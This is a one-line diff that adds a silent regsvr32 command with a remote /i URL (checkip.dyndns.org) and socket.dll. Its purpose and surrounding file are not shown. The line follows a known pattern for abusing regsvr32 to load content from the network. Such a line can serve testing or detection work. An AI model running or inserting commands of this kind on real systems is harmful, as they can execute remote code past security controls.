@@ -1,0 +1,1 @@
+regsvr32 /s /n /i:"http://checkip.dyndns.org/" socket.dll
